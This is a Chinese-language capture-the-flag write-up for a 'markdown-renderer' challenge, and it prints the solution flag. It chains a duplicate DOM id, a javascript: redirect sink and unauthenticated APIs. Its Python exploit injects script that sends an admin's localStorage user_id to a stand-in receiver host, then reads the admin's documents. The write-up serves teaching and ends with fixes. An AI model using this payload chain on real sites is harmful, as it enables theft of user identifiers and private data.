# markdown-renderer

## 题目简述

Markdown 正文经过 DOMPurify，直接注入脚本会被清理；但页面还存在三个可组合缺陷：注册页把 `redirect` 参数直接赋给 `window.location.href`，允许 `javascript:`；渲染页依赖固定 DOM id `markdownList`，可被攻击者 Markdown 制造的同名元素抢占；用户及 Markdown 详情接口没有访问控制。目标是先让管理员机器人泄露其 `localStorage.user_id`，再读取它刚创建且包含 flag 的 Markdown。

## 解题过程

管理员机器人会先注册 `admin`，把返回的用户 ID 写进同源 `localStorage`，创建一篇正文含 flag 的 Markdown，然后访问攻击者提交的页面，最后执行：

```javascript
await page.click(`#markdownList>li>a`);
```

攻击者的 Markdown 可以包含一个无脚本的安全相对链接：

```html
<ul id="markdownList">
  <li><a href="/register?redirect=javascript:PAYLOAD">Click me</a></li>
</ul>
```

这段 HTML 能通过 DOMPurify，因为 `href` 本身以同源 `/register` 开头。页面随后还会创建自己的同名列表，但 CSS 选择器首先命中攻击者列表中的链接。点击后进入注册页；该页发现本地已有 `user_id`，直接执行 `window.location.href = redirect`，于是查询参数中的 `javascript:` 代码在同源上下文运行，可以读取管理员的 localStorage。

以下脚本创建攻击 Markdown。官方脚本的 `BASE_URL` 缺少 scheme，原样会触发 Requests 的 `MissingSchema`；这里已补成完整 HTTPS URL：

```python
import urllib.parse
import requests

BASE_URL = "https://markdown-renderer.tjc.tf"
HOOK = "https://your-receiver.example/collect"

session = requests.Session()
user_id = session.post(
    BASE_URL + "/register", json={"username": "attacker"}
).json()["user_id"]

javascript = (
    "document.location='" + HOOK + "?q='"
    "+encodeURIComponent(localStorage.getItem('user_id'))"
)
redirect = "/register?redirect=javascript:" + urllib.parse.quote(
    javascript, safe=""
)
markdown = (
    '<ul id="markdownList"><li><a href="'
    + redirect + '">Click me</a></li></ul>'
)

markdown_id = session.post(
    BASE_URL + "/render",
    json={"user_id": user_id, "markdown": markdown},
).json()["markdown_id"]
print(BASE_URL + "/markdown/" + markdown_id)
```

把输出页面交给管理员机器人。接收端拿到管理员用户 ID 后，无需 Cookie 即可枚举并读取其 Markdown：

```python
admin_user_id = input("管理员 user_id：").strip()
markdown_ids = requests.get(
    BASE_URL + "/user/" + admin_user_id
).json()

for markdown_id in markdown_ids:
    details = requests.get(
        BASE_URL + "/markdown/" + markdown_id + "/details"
    ).json()
    print(details["content"])
```

机器人创建的正文中包含：

```text
tjctf{sup3r_m4rked_1n_html_ea3c22e841b}
```

## 方法总结

- 核心技巧：用重复 DOM id 劫持机器人点击目标，经开放重定向式 `javascript:` sink 泄露 localStorage，再利用无鉴权 API 读取秘密文档。
- 识别信号：管理员脚本使用固定 CSS 选择器、DOMPurify 只保护 Markdown 容器、注册页信任 `redirect`、身份标识存于 localStorage、对象接口没有所有权检查。
- 复用要点：URL 跳转应只允许明确的同源 HTTP(S) 路径并拒绝 `javascript:`；自动化机器人应精确选择可信元素；所有用户和对象读取接口都必须做服务端授权。
